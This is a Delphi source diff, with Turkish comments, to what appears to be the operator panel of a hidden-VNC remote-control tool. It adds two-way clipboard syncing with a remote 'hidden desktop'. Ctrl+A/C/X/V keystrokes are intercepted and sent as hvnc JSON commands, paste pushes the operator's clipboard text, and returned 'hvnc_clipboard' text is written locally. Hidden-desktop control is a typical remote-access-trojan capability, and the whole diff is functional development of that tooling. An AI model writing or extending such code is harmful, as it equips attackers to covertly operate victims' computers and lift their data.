@@ -7,7 +7,7 @@ uses
   System.SysUtils, System.Variants, System.Classes, System.Types,
   System.JSON, System.SyncObjs,
   Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
-  Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.Imaging.jpeg,
+  Vcl.StdCtrls, Vcl.ExtCtrls, Vcl.ComCtrls, Vcl.Imaging.jpeg, Vcl.Clipbrd,
   ncLines;
 
 type
@@ -81,7 +81,8 @@ type
     procedure SendControlCommand(const Action: string;
       X: Integer = -1; Y: Integer = -1;
       Button: Integer = -1; KeyCode: Integer = -1;
-      InjectFocus: Boolean = False);
+      InjectFocus: Boolean = False;
+      const Text: string = '');
 
     procedure DisableChildFocus;
     procedure WMSetFocus(var Message: TWMSetFocus); message WM_SETFOCUS;
@@ -459,7 +460,7 @@ end;
 //  JSON kontrol komutu gönder
 // -------------------------------------------------------------------------
 procedure TForm10.SendControlCommand(const Action: string;
-  X, Y, Button, KeyCode: Integer; InjectFocus: Boolean);
+  X, Y, Button, KeyCode: Integer; InjectFocus: Boolean; const Text: string);
 var
   JSONObj : TJSONObject;
   NormX   : Integer;
@@ -484,6 +485,8 @@ begin
     if KeyCode <> -1 then JSONObj.AddPair('keycode', TJSONNumber.Create(KeyCode));
     if InjectFocus and (FFocusedHwnd <> 0) then
       JSONObj.AddPair('focused_hwnd', TJSONNumber.Create(FFocusedHwnd));
+    if Text <> '' then
+      JSONObj.AddPair('text', Text);
     FSendJSON(FLine, JSONObj);
   finally
     JSONObj.Free;
@@ -663,6 +666,14 @@ begin
       except
       end;
     end;
+  end
+  else if Action = 'hvnc_clipboard' then
+  begin
+    if Assigned(JSONObj.Values['text']) then
+    begin
+      Clipboard.AsText := JSONObj.Values['text'].Value;
+      LogToStatus('Clipboard updated from hidden desktop.');
+    end;
   end;
 end;
 
@@ -737,6 +748,37 @@ begin
   if not FPaintBoxActive then Exit;
 
   OriginalKey := Key;
+
+  // Intercept Ctrl+A/C/X/V
+  if (ssCtrl in Shift) and not (ssAlt in Shift) then
+  begin
+    case OriginalKey of
+      Ord('A'):
+        begin
+          SendControlCommand('hvnc_selectall', -1, -1, -1, -1, True);
+          Key := 0;
+          Exit;
+        end;
+      Ord('C'):
+        begin
+          SendControlCommand('hvnc_copy', -1, -1, -1, -1, True);
+          Key := 0;
+          Exit;
+        end;
+      Ord('X'):
+        begin
+          SendControlCommand('hvnc_cut', -1, -1, -1, -1, True);
+          Key := 0;
+          Exit;
+        end;
+      Ord('V'):
+        begin
+          SendControlCommand('hvnc_paste', -1, -1, -1, -1, True, Clipboard.AsText);
+          Key := 0;
+          Exit;
+        end;
+    end;
+  end;
 
   // Enter / Space'in UI butonunu tetiklemesini engelle
   if (Key = VK_RETURN) or (Key = VK_SPACE) then
